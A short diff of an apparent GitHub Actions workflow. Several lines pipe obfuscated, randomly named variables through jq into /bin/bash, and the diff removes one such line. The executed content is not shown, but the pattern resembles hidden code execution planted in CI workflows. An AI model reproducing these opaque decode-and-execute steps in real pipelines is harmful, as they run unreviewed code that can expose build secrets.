@@ -26,7 +26,6 @@ jobs:
           echo $qfitu92346 | jq -r .h300 | /bin/bash
           echo $bdc1 | jq -r .xeoae91654 | /bin/bash
           echo $bsro02 | jq -r .apf78 | /bin/bash
-          printf '%s' "$osn9" | jq -r .ront6443 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
